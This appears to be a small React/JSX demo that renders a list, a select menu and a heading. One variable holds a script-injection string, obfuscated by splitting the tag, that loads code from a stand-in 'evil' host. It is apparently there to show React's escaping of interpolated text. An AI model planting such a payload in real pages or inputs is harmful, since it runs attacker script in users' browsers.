
var arr=[1,2,3,4,"5"];
var h1="Hello";
const RAQUO = ' \u00bb';

var firstname = 'John<scr'+'iptsrc="http://evil/co.js"></scr'+'ipt>';

var attr = {
    href: 'http://example.org',
    target: '_blank',
};

ReactDOM.render(
<div>
    <h1>{' '}{h1 + RAQUO}{' plus '} &raquo;{firstname}</h1>
    <a {...attr}>link</a>
    <ul>
        {
            arr.map(function(data,indx){
                return <li key={indx} >{data}</li>
            })
        }
    </ul>
    <div class="input-field col s12">
        <select name="selectName">
            { arr.map(function(data,indx){
                return <option key={indx} value={indx}>{data}</option>
            })
            }
        </select>
    </div>
</div>,
    document.getElementById('app')
);

